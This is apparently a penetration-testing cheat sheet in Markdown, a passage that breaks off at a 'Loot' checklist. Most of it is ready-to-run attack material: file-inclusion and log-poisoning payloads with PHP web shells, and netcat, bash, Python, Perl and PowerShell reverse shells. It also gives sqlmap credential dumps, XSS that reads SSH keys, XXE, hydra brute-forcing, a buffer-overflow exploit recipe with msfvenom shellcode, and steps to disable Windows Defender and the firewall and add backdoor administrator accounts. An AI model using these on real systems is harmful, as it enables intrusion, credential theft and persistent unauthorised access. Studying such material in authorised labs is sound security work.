# Ordered output
curl -s http://10.11.1.111/gallery.php?page=/etc/passwd
/root/Tools/Kadimus/kadimus -u http://10.11.1.111/example.php?page=

http://10.11.1.111/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd && base64 -d savefile.php
http://10.11.1.111/page=http://10.11.1.111/maliciousfile.txt%00 or ?
?page=php://filter/convert.base64-encode/resource=../config.php
../../../../../boot.ini

amap -d 10.11.1.111 8000

# LFI Windows
http://10.11.1.111/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00

# Contaminating log files
root@kali:~# nc -v 10.11.1.111 80
10.11.1.111: inverse host lookup failed: Unknown host
(UNKNOWN) [10.11.1.111] 80 (http) open
 <?php echo shell_exec($_GET['cmd']);?> 
 
http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig

# RFI:
http://10.11.1.111/addguestbook.php?LANG=http://10.11.1.111:31/evil.txt%00
Content of evil.txt:
<?php echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe") ?>

# PHP Filter:
http://10.11.1.111/index.php?m=php://filter/convert.base64-encode/resource=config

# RFI over SMB (Windows)
cat php_cmd.php
	<?php echo shell_exec($_GET['cmd']);?>
- Start SMB Server in attacker machine and put evil script
- Access it via browser (2 request attack):
	- http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c Invoke-WebRequest -Uri "http://10.10.14.42/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"
	- http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe ATTACKER_IP 1234

```

### SQL-Injection

```
# References
https://www.exploit-db.com/papers/17934
https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/

# Post
./sqlmap.py -r search-test.txt -p tfUPass

# Get
sqlmap -u "http://10.11.1.111/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://10.11.1.111 --dbms=mysql --crawl=3

# Full auto - THE GOOD ONE
sqlmap -u 'http://10.11.1.111:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch
# Columns 
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --columns -T users -D admin
# Values
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --dump -T users -D admin

sqlmap -o -u "http://10.11.1.111:1337/978345210/index.php" --data="username=admin&password=pass&submit=+Login+" --method=POST --level=3 --threads=10 --dbms=MySQL --users --passwords

# NoSQL
' || 'a'=='a
mongodbserver:port/status?text=1

#in URL
username[$ne]=toto&password[$ne]=toto

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt":""}, "password": {"$gt":""}}

## SSRF

web that send request to external IP's, we call 127.0.0.1:8080 / 10.1.10.111 to enum internal network

chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:3000
GET /ssrf?user=&comment=&link=http://127.0.0.1:3000 HTTP/1.1

Also we can enum ports
```

### XSS

```
<script>alert("XSS")</script>
<script>alert(1)</script>

https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?m=1

" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText.fontsize(1)) }; x.open("GET","file:///home/reader/.ssh/id_rsa"); x.send(); </script>

" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); </script>

# XXE

XML entry that reads server, Doctype, change to entity "System "file:///etc/passwd""

Instead POST:

<?xml version="1.0" ?>
    <!DOCTYPE thp [
        <!ELEMENT thp ANY>
        <!ENTITY book "Universe">
    ]>
    <thp>Hack The &book;</thp>
    
Malicious XML:

<?xml version="1.0" ?><!DOCTYPE thp [ <!ELEMENT thp ANY>
<!ENTITY book SYSTEM "file:///etc/passwd">]><thp>Hack The
%26book%3B</thp>

XXE OOB

<?xml version="1.0"?><!DOCTYPE thp [<!ELEMENT thp ANY >
<!ENTITY % dtd SYSTEM "http://[YOUR_IP]/payload.dtd"> %dtd;]>
<thp><error>%26send%3B</error></thp>
```

### Sql-login-bypass

- Open Burp-suite
- Make and intercept a request
- Send to intruder
- Cluster attack.
- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
- Attack
- Check for response length variation

### Bypass image upload restrictions

```
- Change extension: .pHp3 or pHp3.jpg
- Modify mimetype: Content-type: image/jpeg
- Bypass getimagesize(): exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
- Add gif header: GIF89a;
- All at the same time.
```

## Password brute force - last resort

Offline local resources

```
cewl
hash-identifier
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
medusa -h 10.11.1.111 -u admin -P password-file.txt -M http -m DIR:/admin -T 10
ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.111
crowbar -b rdp -s 10.11.1.111/32 -u victim -C /root/words.txt -n 1
hydra -l root -P password-file.txt 10.11.1.111 ssh
hydra -P password-file.txt -v 10.11.1.111 snmp
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 ftp -V
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 pop3 -V
hydra -P /usr/share/wordlistsnmap.lst 10.11.1.111 smtp -V

# SIMPLE LOGIN GET
hydra -L cewl_fin_50.txt -P cewl_fin_50.txt 10.11.1.111 http-get-form "/~login:username=^USER^&password=^PASS^&Login=Login:Unauthorized" -V

# GET FORM with HTTPS
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1.111 -s 443 -S https-get-form "/index.php:login=^USER^&password=^PASS^:Incorrect login/password\!"

# SIMPLE LOGIN POST
hydra -l root@localhost -P cewl 10.11.1.111 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I

# API REST LOGIN POST
hydra -l admin -P /usr/share/wordlists/wfuzz/others/common_pass.txt -V -s 80 10.11.1.111 http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:Bad credentials" -t 64

# Dictionary creation
https://github.com/LandGrey/pydictor
https://github.com/Mebus/cupp
git clone https://github.com/sc0tfree/mentalist.git
```

Online crackers

```
https://hashkiller.co.uk/Cracker
https://www.cmd5.org/
https://www.onlinehashcrack.com/
https://gpuhash.me/
https://crackstation.net/
https://crack.sh/
https://hash.help/
https://passwordrecovery.io/
http://cracker.offensive-security.com/
```

# **Vulnerability analysis**

## BOF

```
# BASIC GUIDE
1. Send "A"*1024
2. Replace "A" with /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l LENGTH
3. When crash "!mona findmsp" (E10.11.1.111 offset) or ""/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q TEXT" or "!mona pattern_offset eip"
4. Confirm the location with "B" and "C"
5. Check for badchars instead CCCC (ESP):
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
with script _badchars.py and 
"!mona compare -a esp -f C:\Users\IEUser\Desktop\badchar_test.bin"
	5.1 AWESOME WAY TO CHECK BADCHARS (https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/):
		a. !mona config -set workingfolder c:\logs\%p
	    b. !mona bytearray -b "\x00\x0d"
	    c. Copy from c:\logs\%p\bytearray.txt to python exploit and run again
	    d. !mona compare -f C:\logs\%p\bytearray.bin -a 02F238D0 (ESP address)
	    e. In " data", before unicode chars it shows badchars.
 6. Find JMP ESP with "!mona modules" or "!mona jmp -r esp" or "!mona jmp -r esp -cpb '\x00\x0a\x0d'" find one with security modules "FALSE"
 
	6.1 Then, "!mona find -s "\xff\xe4" -m PROGRAM/DLL-FALSE"
	6.2 Remember put the JMP ESP location in reverse order due to endianness: 5F4A358F will be \x8f\x35\x4a\x5f


7. Generate shellcode and place it:
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.1.111 LPORT=4433 -f python –e x86/shikata_ga_nai -b "\x00"

msfvenom -p windows/shell_reverse_tcp lhost=10.11.1.111 lport=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f python -v shellcode

8. Final buffer like:
buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode

```



```
################ sample 1 ################################################
#!/usr/bin/python

import socket,sys

if len(sys.argv) != 3:
    print("usage: python fuzzer.py 10.11.1.111 PORT")
    exit(1)

payload = "A" * 1000

ipAddress = sys.argv[1]
port = int(sys.argv[2])

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ipAddress, port))
    s.recv(1024)
    print "Sending payload"
    s.send(payload)
    print "Done"
    s.close()
except:
    print "Error"
    sys.exit(0)

################ sample 2 ################################################
#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

req1 = "AUTH " + "\x41"*1072
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
```



## Find xploits - Searchsploit and google

Where there are many exploits for a software, use google. It will automatically sort it by popularity.

```bash
site:exploit-db.com apache 2.4.7

# Remove dos-exploits

searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

# Only search the title (exclude the path), add the -t
searchsploit -t Apache | grep -v '/dos/'
```

## Reverse Shells

```bash
# Linux 
bash -i >& /dev/tcp/10.11.1.111/4443 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.1.111 4443 >/tmp/f
nc -e /bin/sh 10.11.1.111 4443

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.1.111",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 4433 >/tmp/f')-1\

# Perl
perl -e 'use Socket;$i="10.11.1.111";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Windows
nc -e cmd.exe 10.11.1.111 4443
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.11',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PHP most simple Linux
<?php $sock = fsockopen("10.11.1.111",1234); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);?>
```

# **Privilege escalation**

## Common

```
# Docker
https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/

```

### Set up Webserver

```
python -m SimpleHTTPServer 8080
https://github.com/sc0tfree/updog
updog
```

### Set up FTP Server

```
# Install pyftpdlib
pip install pyftpdlib

# Run (-w flag allows anonymous write access)
python -m pyftpdlib -p 21 -w
```

### Set up TFTP

````
# In Kali
atftpd --daemon --port 69 /tftp

# In reverse Windows
tftp -i 10.11.1.111 GET nc.exe
nc.exe -e cmd.exe 10.11.1.111 4444

http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=nc.exe%20-e%20cmd.exe%2010.11.0.105%204444
````

## Linux

Now we start the whole enumeration-process over gain.

- Kernel exploits
- Programs running as root
- Installed software
- Weak/reused/plaintext passwords
- Inside service
- Suid misconfiguration
- World writable scripts invoked by root
- Unmounted filesystems
- Look in /var/backups
- Look in /etc/fstab y en mount

Less likely

- Private ssh keys
- Bad path configuration
- Cronjobs

### Useful commands

```
# Spawning shell
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
V
Ctrl+Z
stty raw -echo
fg
reset
Ctrl+Z
stty size
stty -rows 48 -columns 120
fg

echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
(From within vi)
:!bash
:set shell=/bin/bash:shell
(From within nmap)
!sh

# Access to more binaries
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Set up webserver
cd /root/oscp/useful-tools/privesc/linux/privesc-scripts; python -m SimpleHTTPServer 8080

# Download all files
wget http://10.11.1.111:8080/ -r; mv 10.11.1.111:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linprivchecker.py unix-privesc-check

./LinEnum.sh -t -k password -r LinEnum.txt
python linprivchecker.py extended
./unix-privesc-check standard

# Writable directories
/tmp
/var/tmp

# Add user to sudoers
useradd hacker
passwd hacker
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

### Basic info

```
uname -a
env
id
cat /proc/version
cat /etc/issue
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/hosts

# Users with login
grep -vE "nologin" /etc/passwd

# Priv Enumeration Scripts
upload /unix-privesc-check
upload /root/Desktop/Backup/Tools/Linux_privesc_tools/linuxprivchecker.py ./
upload /root/Desktop/Backup/Tools/Linux_privesc_tools/LinEnum.sh ./

python linprivchecker.py extended
./LinEnum.sh -t -k password
unix-privesc-check
```

### Kernel exploits

```
site:exploit-db.com kernel version

perl /root/oscp/useful-tools/privesc/linux/Linux_Exploit_Suggester/Linux_Exploit_Suggester.pl -k 2.6

python linprivchecker.py extended
```

### Programs running as root

Look for webserver, mysql or anything else like that.

```
# Metasploit
ps

# Linux
ps aux
```

### Installed software

```
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```

### Weak/reused/plaintext passwords

- Check database config-file
- Check databases
- Check weak passwords

```
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

- Check plaintext

```
./LinEnum.sh -t -k password
```

### Inside service

```
# Linux
netstat -anlp
netstat -ano
```

### Suid misconfiguration

Binary with suid permission can be run by anyone, but when they are run they are run as root!

Example programs:

```
nmap
vim
nano
```

```
# SUID
find / -perm -4000 -type f 2>/dev/null

# ALL PERMS
find / -perm -777 -type f 2>/dev/null

# SUID for current user
find / perm /u=s -user `whoami` 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null

# Writables for current user/group
find / perm /u=w -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null
find / -perm /u+w -user `whoami` 2>/dev/nul

# Dirs with +w perms for current u/g
find / perm /u=w -type -d -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -d -user `whoami` 2>/dev/null
```

### Unmounted filesystems

Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.

```
mount -l
```

### Cronjob

Look for anything that is owned by privileged user but writable for you

```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

### SSH Keys

Check all home directories

```
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

### Bad path configuration

Require user interaction

### Find plain passwords

```
grep -rnw '/' -ie 'pass' --color=always
grep -rnw '/' -ie 'DB_PASS' --color=always
grep -rnw '/' -ie 'DB_PASSWORD' --color=always
grep -rnw '/' -ie 'DB_USER' --color=always
```

### Scripts

#### SUID

```
int main(void){
  setresuid(0, 0, 0);
  system("/bin/bash");
}

# Compile
gcc suid.c -o suid
```

#### PS Monitor for cron

```
#!/bin/bash

# Loop by line
IFS=$'\n'

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
	sleep 1
	old_process=$new_process
done

```

### Linux Privesc Tools

- [GTFOBins](https://gtfobins.github.io/)
- [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
- [LinuxExploitSuggester](https://gitlab.com/kalilinux/packages/linux-exploit-suggester/blob/kali/master/Linux_Exploit_Suggester.pl)
- [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)

### Linux Precompiled Exploits
- [kernel-exploits](https://github.com/lucyoa/kernel-exploits)

## Windows

Now we start the whole enumeration-process over gain. This is a checklist. You need to check of every single one, in this order.

- Kernel exploits
- Cleartext password
- Reconfigure service parameters
- Inside service
- Program running as root
- Installed software
- Scheduled tasks
- Weak passwords

### Basic info

```
systeminfo
set
hostname
net users
net user user1
net localgroups
accesschk.exe -uwcqv "Authenticated Users" *

netsh firewall show state
netsh firewall show config

# Set path
set PATH=%PATH%;C:\xampp\php

whoami /priv

dir/a -> Show hidden & unhidden files
dir /Q -> Show permissions
```

### Kernel exploits


```
# Look for hotfixes
systeminfo

wmic qfe get Caption,Description,HotFixID,InstalledOn

# Search for exploits
site:exploit-db.com windows XX XX
```

### Cleartext passwords

```
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Reconfigure service parameters

- Unquoted service paths

- Weak service permissions

https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/

### Dump process for passwords

```powershell
# Looking for Firefox
Get-Process
./procdump64.exe -ma $PID-FF
Select-String -Path .\*.dmp -Pattern 'password' > 1.txt
type 1.txt | findstr /s /i "admin"
```

### Inside service

Check netstat to see what ports are open from outside and from inside. Look for ports only available on the inside.

```
# Meterpreter
run get_local_subnets

netstat /a
netstat -ano
```

### Programs running as root/system

### Installed software

```
# Metasploit
ps

tasklist /SVC
net start
reg query HKEY_LOCAL_MACHINE\SOFTWARE
DRIVERQUERY

Look in:
C:\Program files
C:\Program files (x86)
Home directory of the user
```

### Scheduled tasks

```
schtasks /query /fo LIST /v

Check this file:
c:\WINDOWS\SchedLgU.Txt
```

### Weak passwords

Remote desktop

```
ncrack -vv --user george -P /root/oscp/passwords.txt rdp://10.11.1.111
```

### Add user and enable RDP

```
# Add new user

net user haxxor Haxxor123 /add
net localgroup Administrators haxxor /add
net localgroup "Remote Desktop Users" haxxor /ADD

# Turn firewall off and enable RDP

sc stop WinDefend
netsh advfirewall show allprofiles
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

### Powershell sudo for Windows

```
$pw= convertto-securestring "EnterPasswordHere" -asplaintext -force
$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist "EnterDomainName\EnterUserName",$pw
$script = "C:\Users\EnterUserName\AppData\Local\Temp\test.bat"
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process $script -verb Runas}'

powershell -ExecutionPolicy Bypass -File xyz.ps1
```

### Windows download with bitsadmin

```
bitsadmin /transfer mydownloadjob /download /priority normal http://<attacker10.11.1.111>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
```

### Windows download with certutil.exe

```
certutil.exe -urlcache -split -f "http://10.11.1.111/Powerless.bat" Powerless.bat
```

### Windows download with powershell

````
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.1.111/file.exe','C:\Users\user\Desktop\file.exe')"

(New-Object System.Net.WebClient).DownloadFile("http://10.11.1.111/CLSID.list","C:\Users\Public\CLSID.list")
````

### Windows Download from FTP

```
# In reverse shell
echo open 10.11.1.111 > ftp.txt
echo USER anonymous >> ftp.txt
echo ftp >> ftp.txt 
echo bin >> ftp.txt
echo GET file >> ftp.txt
echo bye >> ftp.txt

# Execute
ftp -v -n -s:ftp.txt
```

### Windows create SMB Server transfer files

```bash
# Attack machine
python /usr/share/doc/python-impacket/examples/smbserver.py Lab "/root/labs/public/10.11.1.111"

	# Or SMB service 
	# http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html
	vim /etc/samba/smb.conf
		[global]
		workgroup = WORKGROUP
		server string = Samba Server %v
		netbios name = indishell-lab
		security = user
		map to guest = bad user
		name resolve order = bcast host
		dns proxy = no
		bind interfaces only = yes
	
		[ica]
		path = /var/www/html/pub
		writable = no
		guest ok = yes
		guest only = yes
		read only = yes
		directory mode = 0555
		force user = nobody

	chmod -R 777 smb_path
	chown -R nobody:nobody smb_path
	service smbd restart 

# Victim machine with reverse shell
Download: copy \\10.11.1.111\Lab\wce.exe . 
Upload: copy wtf.jpg \\10.11.1.111\Lab

```

### Windows download with VBS

````
# In reverse shell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

# Execute
cscript wget.vbs http://10.11.1.111/file.exe file.exe
````

### Windowss XP SP1 PrivEsc

```bash
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.1.111 4343 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config upnphost depend= ""
net start upnphost
```

### Pass The Hash

```
# Login as user only with hashdump
# From this hashdump
# admin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::

msf5 > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target address range or CIDR identifier
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCR10.11.1.111TION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf5 exploit(windows/smb/psexec) > set rhosts 10.10.0.100
rhosts => 10.10.0.100

msf5 exploit(windows/smb/psexec) > set smbuser admin2

smbuser => admin2

msf5 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7

smbpass => aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7

msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp

payload => windows/x64/meterpreter/reverse_tcp

```

### Scripts

#### Useradd

````
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user <username> <password> /add && net localgroup administrators <username> /add");
  return 0;
}

# Compile
i686-w64-mingw32-gcc -o useradd.exe useradd.c
````

#### Powershell Run As

```
echo $username = '<username>' > runas.ps1
echo $securePassword = ConvertTo-SecureString "<password>" -AsPlainText -Force >> runas.ps1
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
```

#### Powershell Reverse Shell

```powershell
Set-ExecutionPolicy Bypass

$client = New-Object System.Net.Sockets.TCPClient('10.11.1.111',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```



### Windows privesc/enum tools

- [windows-exploit-suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)
- [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
- [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)

### Windows precompiled exploits

- [WindowsExploits](https://github.com/abatchy17/WindowsExploits)

### Windows Port Forwarding

Run in victim (5985 WinRM):

`plink -l LOCALUSER -pw LOCALPASSWORD LOCALIP -R 5985:127.0.0.1:5985 -P 221`

 

# **Loot**

## Linux

**Checklist**

- Proof:
- Network secret:
- Passwords and hashes:
- Dualhomed:
- Tcpdump:
- Interesting files:
- Databases:
- SSH-keys:
- Browser:
- Mail:

### Proof
```
